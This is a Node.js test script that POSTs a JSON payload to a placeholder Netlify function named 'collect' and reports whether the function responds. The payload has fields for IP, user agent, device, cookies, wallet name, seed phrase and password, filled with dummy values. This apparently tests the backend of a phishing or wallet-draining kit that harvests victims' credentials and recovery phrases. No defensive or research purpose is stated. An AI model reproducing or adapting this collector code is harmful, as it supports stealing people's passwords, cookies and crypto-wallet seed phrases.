const https = require("https");

// Replace with your actual Netlify URL
const NETLIFY_URL = "https://your-netlify-app.netlify.app";

async function testNetlifyFunction() {
  const testData = {
    timestamp: new Date().toISOString(),
    ip: "127.0.0.1",
    userAgent: "Test Agent",
    platform: "Test Platform",
    device: "Test Device",
    language: "en-US",
    screen: "1920x1080",
    cookies: "test=true",
    walletName: "Test Wallet",
    seedPhrase: "test seed phrase",
    password: "test password",
  };

  const postData = JSON.stringify(testData);

  const options = {
    hostname: new URL(NETLIFY_URL).hostname,
    port: 443,
    path: "/.netlify/functions/collect",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = "";

      res.on("data", (chunk) => {
        data += chunk;
      });

      res.on("end", () => {
        console.log("Status Code:", res.statusCode);
        console.log("Response Headers:", res.headers);
        console.log("Response Body:", data);
        resolve({ statusCode: res.statusCode, data });
      });
    });

    req.on("error", (error) => {
      console.error("Request Error:", error);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

console.log("Testing Netlify function...");
console.log("Make sure to update NETLIFY_URL with your actual Netlify URL");
console.log("Current URL:", NETLIFY_URL);

testNetlifyFunction()
  .then((result) => {
    if (result.statusCode === 200) {
      console.log("✅ Netlify function is working!");
    } else {
      console.log("❌ Netlify function returned status:", result.statusCode);
    }
  })
  .catch((error) => {
    console.log("❌ Test failed:", error.message);
  });
